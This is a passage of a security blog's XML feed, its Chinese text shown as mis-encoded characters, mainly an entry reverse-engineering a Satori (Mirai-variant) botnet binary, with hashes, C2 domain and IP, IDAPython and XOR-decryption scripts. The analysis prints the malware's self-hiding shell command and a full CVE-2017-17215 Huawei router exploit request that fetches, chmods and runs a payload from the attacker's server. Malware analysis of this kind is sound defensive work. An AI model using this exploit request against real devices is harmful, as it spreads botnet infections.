1.0</td><td>1985å¹´11æœˆ</td><td>åˆå§‹ç‰ˆæœ¬ï¼Œæä¾›åŸºæœ¬çš„å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œåº”ç”¨ç¨‹åºæ”¯æŒ</td><td>1.0</td></tr><tr><td>Windows 2.0</td><td>1987å¹´12æœˆ</td><td>å¼•å…¥äº†çª—å£é‡å ã€å›¾æ ‡å’Œé”®ç›˜å¿«æ·é”®ç­‰æ”¹è¿›</td><td>2.0</td></tr><tr><td>Windows 3.0</td><td>1990å¹´5æœˆ</td><td>æ”¯æŒå¤šä»»åŠ¡å¤„ç†å’ŒTrueTypeå­—ä½“ï¼Œç”¨æˆ·ç•Œé¢å¤§å¹…æ”¹è¿›</td><td>3.0</td></tr><tr><td>Windows 95</td><td>1995å¹´8æœˆ</td><td>å…·æœ‰å¼€å§‹èœå•ã€ä»»åŠ¡æ å’Œ32ä½åº”ç”¨ç¨‹åºæ”¯æŒçš„é‡è¦ç‰ˆæœ¬</td><td>4.0</td></tr><tr><td>Windows 98</td><td>1998å¹´6æœˆ</td><td>å¼•å…¥äº†å¯¹USBè®¾å¤‡å’ŒDVDå…‰ç›˜çš„æ”¯æŒï¼Œæ”¹è¿›äº†ç³»ç»Ÿç¨³å®šæ€§</td><td>4.10</td></tr><tr><td>Windows 2000</td><td>2000å¹´2æœˆ</td><td>å¼ºåŒ–äº†ç³»ç»Ÿç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼Œæä¾›äº†ä¼ä¸šçº§ç‰¹æ€§</td><td>5.0</td></tr><tr><td>Windows XP</td><td>2001å¹´10æœˆ</td><td>å¼•å…¥äº†å…¨æ–°çš„ç”¨æˆ·ç•Œé¢ã€ç³»ç»Ÿæ¢å¤åŠŸèƒ½å’Œå¤šç”¨æˆ·æ”¯æŒ</td><td>5.1</td></tr><tr><td>Windows Vista</td><td>2007å¹´1æœˆ</td><td>å…¨æ–°çš„ç”¨æˆ·ç•Œé¢ã€æ›´é«˜çš„å®‰å…¨æ€§å’Œç³»ç»Ÿç¨³å®šæ€§</td><td>6.0</td></tr><tr><td>Windows 7</td><td>2009å¹´10æœˆ</td><td>ä¼˜åŒ–äº†ç”¨æˆ·ç•Œé¢å’Œæ€§èƒ½ï¼Œæ”¹è¿›äº†ä»»åŠ¡æ å’Œçª—å£ç®¡ç†</td><td>6.1</td></tr><tr><td>Windows 8</td><td>2012å¹´10æœˆ</td><td>å¼•å…¥äº†å…¨æ–°çš„å¼€å§‹å±å¹•å’Œè§¦æ‘¸ä¼˜åŒ–çš„ç”¨æˆ·ç•Œé¢</td><td>6.2</td></tr><tr><td>Windows 10</td><td>2015å¹´7æœˆ</td><td>ç»Ÿä¸€äº†æ¡Œé¢å’Œç§»åŠ¨è®¾å¤‡å¹³å°ï¼Œå¼•å…¥äº†Windowsåº”ç”¨å•†åº—</td><td>10.0</td></tr><tr><td>Windows 11</td><td>2021å¹´10æœˆ</td><td>æ–°çš„ç”¨æˆ·ç•Œé¢è®¾è®¡ã€æ”¹è¿›çš„æ€§èƒ½å’Œå®‰å…¨æ€§ï¼Œæ”¯æŒAndroidåº”ç”¨</td><td>10.0</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windowsç³»ç»Ÿç»“æ„è¿˜æœ‰å¼•å¯¼è¿‡ç¨‹&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Mirai Botnetåˆ†æ”¯Satoriåˆ†æ</title>
    <link href="https://joe1sn.eu.org/2023/03/25/mirai-bota/"/>
    <id>https://joe1sn.eu.org/2023/03/25/mirai-bota/</id>
    <published>2023-03-25T10:42:45.000Z</published>
    <updated>2023-06-01T14:29:56.735Z</updated>
    
    <content type="html"><![CDATA[<p>æš‚æ—¶å…ˆæ›´æ–°è¿™ä¹ˆå¤šï¼Œåé¢åº”è¯¥è¿˜æœ‰ç›¸å…³ä½œè€…è¢«æŠ“çš„ä¸€äº›æ¶ˆæ¯å’Œæ›´å¤šåŠŸèƒ½çš„é€†å‘</p><span id="more"></span><h2 id="åŸºæœ¬æƒ…å†µ"><a class="markdownIt-Anchor" href="#åŸºæœ¬æƒ…å†µ"></a> åŸºæœ¬æƒ…å†µ</h2><table><thead><tr><th>åç§°</th><th>x86_64</th></tr></thead><tbody><tr><td>MD5</td><td>fe7ca3b588e342f79c7814bb75dc24d7</td></tr><tr><td>SHA256</td><td>e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978</td></tr><tr><td>Domain</td><td><a href="http://botnet.nguyennghi.info">botnet.nguyennghi.info</a></td></tr><tr><td>ip</td><td>103.183.118.73</td></tr></tbody></table><h2 id="é€†å‘åˆ†æ"><a class="markdownIt-Anchor" href="#é€†å‘åˆ†æ"></a> é€†å‘åˆ†æ</h2><h3 id="åŸºæœ¬æƒ…å†µ-2"><a class="markdownIt-Anchor" href="#åŸºæœ¬æƒ…å†µ-2"></a> åŸºæœ¬æƒ…å†µ</h3><img src="https://img.joe1sn.top/uploads/big/2dd85cc12949bcd1a7da5287ada77fed.png" alt="image-20230319130912500" style="zoom:50%;" /><p>64ä½ELFå¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="https://img.joe1sn.top/uploads/big/ff35ebac2e5f17da95a18f650aa1c5f6.png" alt="image-20230319131036258" /></p><h3 id="é€†å‘å·¥ç¨‹"><a class="markdownIt-Anchor" href="#é€†å‘å·¥ç¨‹"></a> é€†å‘å·¥ç¨‹</h3><p>é€šè¿‡startæ‰¾åˆ°mainå‡½æ•°</p><p><img src="https://img.joe1sn.top/uploads/big/7f9086994f2d20a717a754d858293a59.png" alt="image-20230319131156050" /></p><p>ä½¿ç”¨IDApythonè„šæœ¬å¯¹ç±»ä¼¼çš„åº“å‡½æ•°å®ç°è¿›è¡Œå‡½æ•°é‡å‘½å</p><p><img src="https://img.joe1sn.top/uploads/big/6ae388e053568f7e0b6209cf80082bbd.png" alt="image-20230319131304684" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    func = idaapi.get_func(func_ea)</span><br><span class="line">    name = idaapi.get_func_name(func_ea)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> head <span class="keyword">in</span> idautils.Heads(func.start_ea, func.end_ea):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = idc.GetDisasm(head)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;syscall&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Function: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name).ljust(<span class="number">0x40</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(code[<span class="number">21</span>:].ljust(<span class="number">0x30</span>,<span class="string">&quot;=&quot;</span>))</span><br><span class="line">                ida_name.set_name(func.start_ea, code[<span class="number">21</span>:])</span><br><span class="line">                idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/9699218d050e3277b97c149a5001e218.png" alt="image-20230319131712988" /></p><p><strong>mainå‡½æ•°</strong></p><ol><li><p>é¦–å…ˆåˆ›å»ºå‘<code>8.8.8.8:13568</code>çš„socketè¿æ¥ï¼Œé€šè¿‡<code>getsockname</code>æµ‹è¯•ç½‘ç»œæ˜¯å¦è¿é€šå¹¶è·å¾—æœ¬æœºipåœ°å€</p><p><img src="https://img.joe1sn.top/uploads/big/e1856f6f33f0c1ef5976e312ad0722e2.png" alt="image-20230319133229045" /></p></li><li><p>åˆå§‹åŒ–åŠ å¯†æ¶ˆæ¯</p><p>ç”±äºä½¿ç”¨æœªçŸ¥ç‰ˆæœ¬çš„libåº“è¿›è¡Œé™æ€ç¼–è¯‘ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è¯†åˆ«ä¸€äº›libå‡½æ•°ã€‚</p><p>æ¯”å¦‚è¿™é‡Œä½¿ç”¨<code>malloc</code>åˆ†é…å¹¶å°†å¯†æ–‡ä½¿ç”¨<code>strncpy</code>å°†æ¶ˆæ¯å¤åˆ¶åˆ°å †ä¸­</p><p><img src="https://img.joe1sn.top/uploads/big/7058438640f17abd7da5ae8736403663.png" alt="image-20230319145038585" /></p></li><li><p>åˆ©ç”¨<code>pid</code>å’Œéšæœºæ•°è¿›è¡Œéšæœºæ•°ç”Ÿæˆï¼Œå¯¹è¿›ç¨‹è¿›è¡Œéšæœºæ”¹å</p><ul><li><p>å°†timeç”Ÿæˆçš„ä¼ªéšæœºæ•°å’Œpidè¿›è¡Œå¼‚æˆ–ç­‰æ“ä½œå¾—åˆ°éšæœºæ•°</p><p><img src="https://img.joe1sn.top/uploads/big/c3fa4dc9012d5d9d226257bc0a7ad6e8.png" alt="image-20230319145721197" /></p></li><li><p>é€šè¿‡ä½ç§»ç­‰æ“ä½œå®ç°éšæœºæ•°çš„èŒƒå›´æ§åˆ¶</p></li></ul><p><img src="https://img.joe1sn.top/uploads/big/c16e53f2ec6c8b3dd41d531f26f25633.png" alt="image-20230319145655202" /></p><ul><li><p>åœ¨ä¹‹åä½¿ç”¨<code>ptrcl</code>è¿›è¡Œè¿›ç¨‹çš„é‡å‘½å</p><p><img src="https://img.joe1sn.top/uploads/big/f9ee442f2eb39f67156721672c18f159.png" alt="image-20230319164552839" /></p></li></ul></li><li><p>æ‹¼æ¥æŒ‡ä»¤è¿‡åï¼Œä¿®æ”¹ç›¸å…³ä¿¡å·å˜é‡å€¼ï¼Œå¹¶åœ¨<code>vfork</code>çš„<code>execl</code>ä¸­æ‰§è¡Œ</p><ul><li><p>æ‹¼æ¥å‘½ä»¤å­—ç¬¦ä¸²</p><p><img src="https://img.joe1sn.top/uploads/big/e8dc6791e9c8617b59761f5d15e5999c.png" alt="image-20230319164254112" /></p></li><li><p>è®¾ç½®ä¿¡å·é‡å¹¶ä½¿ç”¨vforkæ‰§è¡Œ</p><p><img src="https://img.joe1sn.top/uploads/big/69316bf83fad9f326f58e874975dd2e6.png" alt="image-20230319164122065" /></p><p><img src="https://img.joe1sn.top/uploads/big/16fb3f0838f0cffc01c01207cb1f8c5c.png" alt="image-20230319163508664" /></p></li><li><p>vforkéƒ¨åˆ†</p><p><img src="https://img.joe1sn.top/uploads/big/268aff2f4a3d3e64a33004ceef665ca9.png" alt="image-20230319164454462" /></p></li><li><p>æ‰§è¡Œçš„è¯­å¥ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \336\377\377\377\177; &gt;bin/watchdog &amp;&amp;  mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog</span><br></pre></td></tr></table></figure><ol><li>éšæœºé€‰æ‹©  <code>&quot;/bin/busybox&quot;;</code>ã€<code>&quot;/bin/watchdog&quot;</code>ã€<code>&quot;/bin/systemd&quot;</code>ä¸­çš„ä¸€ä¸ªï¼ˆ<code>$root_random_name</code>ï¼‰ä¸­çš„ä¸€ä¸ª<strong>åˆ é™¤</strong></li><li>å½“å‰æ–‡ä»¶å¤¹åˆ›å»º<code>bin</code>ç›®å½•</li><li>å°†å½“å‰ç›®å½•ä¸‹çš„ç—…æ¯’ç§»åŠ¨è‡³åˆ›å»ºçš„<code>bin</code>ç›®å½•ä¸­ï¼Œå¹¶é‡å‘½å<code>$root_random_name</code></li><li>ç»™äºˆ<code>bin/$root_random_name</code>æœ€é«˜æƒé™</li></ol><p>é€šè¿‡å¤šæ¬¡è¿è¡Œå¯ä»¥æˆåŠŸå®ç°ï¼Œå¦‚æœ<code>&amp;&amp; mkdir bin \336\377\377\377\177</code>ä¸­æ²¡æœ‰ä¹±ç ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œåä¸€å¥</p><p><img src="https://img.joe1sn.top/uploads/big/e6955edfd176db8c53e504286d3be6d7.png" alt="image-20230319230512195" /></p></li></ul></li><li><p>ä½¿ç”¨å¼‚æˆ–è§£å¯†å­—ç¬¦ä¸²å¹¶æ‰“å°ï¼Œå®ŒæˆååŠ å¯†å­—ç¬¦ä¸²</p><ul><li><p>è¿‡ç¨‹</p><p><img src="https://img.joe1sn.top/uploads/big/2cf1740082e2104f5c6be1f730334279.png" alt="image-20230319173516052" /></p></li><li><p>åˆ©ç”¨å…¶è‡ªèº«çš„è§£å¯†è„šæœ¬ï¼Œå¯ä»¥è§£å¯†æ‰€æœ‰å¯†æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">str1 = [ <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x41</span>, <span class="number">0x2E</span>]</span><br><span class="line">str2 = [<span class="number">0x4A</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>]</span><br><span class="line">str3 = [<span class="number">0x01</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x2E</span>]</span><br><span class="line">str4 = [<span class="number">0x01</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line">str5 = [<span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2E</span>]</span><br><span class="line">str6 = [<span class="number">0x01</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x6D53D2C2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher:<span class="built_in">list</span></span>):</span><br><span class="line">    v3 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    v4 = key &gt;&gt; <span class="number">8</span></span><br><span class="line">    v5 = (key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    v6 = (key &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        result += <span class="built_in">chr</span>((i^v3^v4^v5^v6 )&amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>, decrypt(str1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2&quot;</span>, decrypt(str2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3&quot;</span>, decrypt(str3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;4&quot;</span>, decrypt(str4))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;5&quot;</span>, decrypt(str5))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6&quot;</span>, decrypt(str6))</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/23f89924f7290216402f2dbee10c1f43.png" alt="image-20230319220907909" /></p></li><li><p>åŠ å¯†å­—ç¬¦ä¸²ï¼Œç”±äºæ˜¯å¼‚æˆ–åŠ å¯†ï¼Œæ‰€ä»¥åŠ è§£å¯†ç®—æ³•ä¸€è‡´</p></li></ul></li></ol><p><img src="https://img.joe1sn.top/uploads/big/603b9a71f69d32f0b9937d4c40d4e2eb.png" alt="image-20230319174504355" /></p><p><img src="https://img.joe1sn.top/uploads/big/8c79bfcbe91463df2c3555e3de8b40d0.png" alt="image-20230319174521783" /></p><ol start="6"><li><p>åˆé€‚å‡½æ•°è¡¨ï¼Œè®²å‡½æ•°æ”¾åˆ°ä¸€ä¸ªtableä¸­</p><p><img src="https://img.joe1sn.top/uploads/big/6e49a88320fb86ab46e96687914965bd.png" alt="image-20230325174924309" /></p></li><li><p>ä½¿ç”¨<code>fork</code>è·å¾—å­è¿›ç¨‹ï¼Œæ‰“å¼€<code>/proc</code>æ–‡ä»¶å¤¹å¹¶è¯»å–å…¶ä¸­çš„æ–‡ä»¶ï¼Œå…³é—­é™¤å¿…è¦è¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹</p><ul><li><p>æ‰“å¼€<code>/proc/</code>æ–‡ä»¶å¤¹</p><p><img src="https://img.joe1sn.top/uploads/big/fc58ad13d588c9c5bfd0718b076a8ec8.png" alt="image-20230325175147772" /></p><p><img src="https://img.joe1sn.top/uploads/big/c52029cd2018a1d2b7c8cd50bfb58c4b.png" alt="image-20230325175200591" /></p></li><li><p>å…³é—­é™¤å¿…è¦è¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹</p><p><img src="https://img.joe1sn.top/uploads/big/f6c419b41761495db52182270509e87f.png" alt="image-20230325175235928" /></p></li></ul></li><li><p>ä½¿ç”¨SSDPåè®®è¿›è¡Œç½‘ç»œå‘åŒ…ï¼Œä½¿ç”¨åä¸ºHG532è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰çš„payloadè¿›è¡Œå‘åŒ…ï¼Œè¿›è¡Œæ”»å‡»</p><ul><li><p>è¿›è¡Œæ”»å‡»</p><ol><li><p>åˆ›å»ºsocket</p><p><img src="https://img.joe1sn.top/uploads/big/82f418b30b12d5cd5f0340a65dacecd5.png" alt="image-20230325175953274" /></p></li><li><p>è®¾ç½® socket é€‰é¡¹ï¼Œå…è®¸å‘ç»„æ’­åœ°å€å‘é€æ•°æ®</p><p><img src="https://img.joe1sn.top/uploads/big/5df10655306d34b61114564c0e610cf9.png" alt="image-20230325181258334" /></p></li><li><p>è®¾ç½®ç›®æ ‡åœ°å€å’Œç«¯å£å·</p><p><img src="https://img.joe1sn.top/uploads/big/5fdd3eff4830d76f22e248fac58f4c1c.png" alt="image-20230325181453140" /></p></li><li><p>æ„é€  M-SEARCH è¯·æ±‚æŠ¥æ–‡ï¼Œå‘é€æœç´¢è¯·æ±‚</p><p><img src="https://img.joe1sn.top/uploads/big/f6ec95904237a3f131f02eb4eed5db82.png" alt="image-20230325175636859" /></p><p><img src="https://img.joe1sn.top/uploads/big/1a9561f1e58f0b6efcd84e98fa54dad6.png" alt="image-20230325175725576" /></p><p><img src="https://img.joe1sn.top/uploads/big/3331ad455db311c3c1ae6f49c223d273.png" alt="image-20230325175739448" /></p></li></ol></li><li><p>payloadåˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e</span><br><span class="line">3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line">Content-Length: 457</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">        &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt;</span><br><span class="line">        &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒè¯­å¥</p><p><code>/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei</code></p></li></ul></li></ol><h2 id="ç½‘ç»œè¿æ¥ç›¸å…³"><a class="markdownIt-Anchor" href="#ç½‘ç»œè¿æ¥ç›¸å…³"></a> ç½‘ç»œè¿æ¥ç›¸å…³</h2><h3 id="dns-server"><a class="markdownIt-Anchor" href="#dns-server"></a> DNS SERVER</h3><table><thead><tr><th><a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a>.</th><th>173.245.59.65 <a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a></th><th>CLOUDFLARENET United States</th></tr></thead><tbody><tr><td><a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a>.</td><td>108.162.194.192 <a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a></td><td>CLOUDFLARENET United States</td></tr></tbody></table><h3 id="host-records-a"><a class="markdownIt-Anchor" href="#host-records-a"></a> Host Records (A)</h3><table><thead><tr><th><a href="http://nguyennghi.info">nguyennghi.info</a>    HTTP: cloudflare</th><th>104.21.78.122</th><th>CLOUDFLARENET unknown</th></tr></thead><tbody><tr><td><a href="http://antiddos.nguyennghi.info">antiddos.nguyennghi.info</a></td><td>103.161.181.140</td><td>DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam</td></tr><tr><td><a href="http://checkht4gvpn.nguyennghi.info">checkht4gvpn.nguyennghi.info</a>    <br>HTTP: cloudflare</td><td>172.67.220.248</td><td>CLOUDFLARENET United States</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;æš‚æ—¶å…ˆæ›´æ–°è¿™ä¹ˆå¤šï¼Œåé¢åº”è¯¥è¿˜æœ‰ç›¸å…³ä½œè€…è¢«æŠ“çš„ä¸€äº›æ¶ˆæ¯å’Œæ›´å¤šåŠŸèƒ½çš„é€†å‘&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="git" scheme="https://joe1sn.eu.org/tags/git/"/>
    
  </entry>
  
</feed>
